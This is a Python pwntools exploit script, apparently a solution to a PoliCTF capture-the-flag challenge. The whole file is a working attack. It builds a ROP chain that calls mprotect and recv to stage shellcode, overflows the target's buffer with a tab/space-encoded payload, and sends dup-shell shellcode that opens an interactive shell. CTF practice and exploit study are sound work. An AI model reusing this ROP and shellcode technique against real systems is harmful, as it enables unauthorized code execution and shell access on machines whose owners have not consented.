#!/usr/bin/env python
from pwn import *
from pwn.i386.linux import dupsh, asm
from pwn.aeROPics import aeROPics, ropcall

sock = remote('localhost', 32000, timeout = None)
# sock = remote('pwn.challenges.polictf.it', 32000)

codeaddr = 0x0804b090

shellcode = asm(dupsh(0))

a = aeROPics('./chal')
ropcall(a.plt.mprotect, (a.segments._got_plt, len(shellcode), 7))
ropcall(a.plt.recv, (0, codeaddr, len(shellcode), 0))
ropcall(codeaddr)
sock.send('black'.ljust(16, '\n'))

data = 'A' * 512 + p32(32)*4 + str(a)
data = bits_str(data, endian = 'big', one='\t', zero=' ')
data = data.ljust(512 * 10, ' ')
sock.send(data)

sock.send(shellcode)
sock.interactive()
